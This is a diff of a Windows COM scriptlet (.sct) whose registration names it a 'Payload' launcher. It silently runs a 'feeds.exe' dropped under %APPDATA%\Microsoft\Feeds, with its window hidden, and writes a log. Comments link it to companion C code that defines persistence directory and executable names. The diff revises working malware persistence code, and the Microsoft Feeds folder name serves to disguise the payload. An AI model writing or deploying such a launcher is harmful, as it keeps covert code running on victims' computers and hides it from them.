@@ -1,13 +1,12 @@
 <?xml version="1.0"?>
 <scriptlet>
   <registration
-      progid="MyPayload.LauncherSCT"
-      classid="{3041efca-5fb4-4f53-b9f6-8ccc8aef6711}" <!-- Generate a NEW, UNIQUE GUID for this scriptlet component -->
+      progid="FeedsPayload.Launcher" <!-- You can change this -->
+      classid="{3041efca-5fb4-4f53-b9f6-8ccc8aef6711}" <!-- IMPORTANT: Generate a NEW, UNIQUE GUID for this scriptlet's own registration -->
       remotable="true">
     <script language="JScript">
       <![CDATA[
-        // This is a dummy object for the scriptlet component registration.
-        // The main logic is in the 'script' tag below.
+        // This object is mainly for registration purposes. The main logic is below.
       ]]>
     </script>
   </registration>
@@ -15,21 +14,23 @@
   <script language="JScript">
     <![CDATA[
       // --- CONFIGURATION ---
-      var relativeDirPath = "\\Microsoft\\Feeds";       // The directory name within APPDATA
-      var executableName  = "feeds.exe";  // The name of your payload executable in that directory
+      // This should match what's in your C code's PERSIST_DIR_NAME and PERSIST_EXE_NAME,
+      // relative to %APPDATA%.
+      var relativeDirPathFromAppData = "\\Microsoft\\Feeds"; 
+      var executableNameInDir  = "feeds.exe";
+      var logFileName = "sct_feeds_launcher.log"; // Log file for this SCT script
 
-      function writeLog(message) {
+      function writeToLog(message) {
         try {
           var fso = new ActiveXObject("Scripting.FileSystemObject");
           var shell = new ActiveXObject("WScript.Shell");
           var appDataPath = shell.ExpandEnvironmentStrings("%APPDATA%");
-          var logDir = appDataPath + relativeDirPath;
-          var logFilePath = logDir + "\\sct_execution.log";
+          var logDir = appDataPath + relativeDirPathFromAppData;
+          var logFilePath = logDir + "\\" + logFileName;
 
           if (!fso.FolderExists(logDir)) {
-            // Attempt to create if it doesn't exist, though C# code should have.
-            // This is a fallback.
-            try { fso.CreateFolder(logDir); } catch (e) { /* best effort */ }
+            // The C code should have created this. If not, best effort.
+            try { fso.CreateFolder(logDir); } catch (e) { /* ignore */ }
           }
           
           var ts = fso.OpenTextFile(logFilePath, 8, true); // 8 = Append, true = Create if not exists
@@ -37,30 +38,35 @@
           ts.WriteLine("[" + now.toUTCString() + "] " + message);
           ts.Close();
         } catch (e) {
-          // Cannot log, oh well.
+          // Cannot write log.
         }
       }
 
       try {
-        writeLog("SCT Scriptlet: Starting execution.");
-        var shell = new ActiveXObject("WScript.Shell");
-        var appData = shell.ExpandEnvironmentStrings("%APPDATA%");
-        var fullExePath = appData + relativeDirPath + "\\" + executableName;
-        writeLog("SCT Scriptlet: Attempting to launch: " + fullExePath);
+        writeToLog("SCT Feeds Launcher: Scriptlet starting.");
+        
+        var oShell = new ActiveXObject("WScript.Shell");
+        var sAppData = oShell.ExpandEnvironmentStrings("%APPDATA%");
+        var sFullExePath = sAppData + relativeDirPathFromAppData + "\\" + executableNameInDir;
+        
+        writeToLog("SCT Feeds Launcher: Target EXE path: " + sFullExePath);
 
-        // Check if file exists before trying to run (optional, but good for debug)
-        var fso = new ActiveXObject("Scripting.FileSystemObject");
-        if (fso.FileExists(fullExePath)) {
-          writeLog("SCT Scriptlet: File exists. Running...");
-          // The '0' hides the window, 'false' means don't wait for it to finish.
-          shell.Run('"' + fullExePath + '"', 0, false);
-          writeLog("SCT Scriptlet: shell.Run command issued for " + fullExePath);
+        var oFSO = new ActiveXObject("Scripting.FileSystemObject");
+        if (oFSO.FileExists(sFullExePath)) {
+          writeToLog("SCT Feeds Launcher: Executable found. Attempting to run...");
+          oShell.Run('"' + sFullExePath + '"', 0, false); // 0 = hide window, false = do not wait
+          writeToLog("SCT Feeds Launcher: shell.Run command issued for: " + sFullExePath);
         } else {
-          writeLog("SCT Scriptlet: ERROR - Executable not found at: " + fullExePath);
+          writeToLog("SCT Feeds Launcher: ERROR - Executable NOT FOUND at: " + sFullExePath);
         }
-      } catch (e) {
-        var errorMsg = "SCT Scriptlet: EXCEPTION - " + (e.description || e.message || "Unknown error");
-        writeLog(errorMsg);
+      } catch (err) {
+        var errorDescription = "Unknown error";
+        if (err.description && err.description !== "") {
+          errorDescription = err.description;
+        } else if (err.message && err.message !== "") {
+          errorDescription = err.message;
+        }
+        writeToLog("SCT Feeds Launcher: EXCEPTION - " + errorDescription);
       }
     ]]>
   </script>
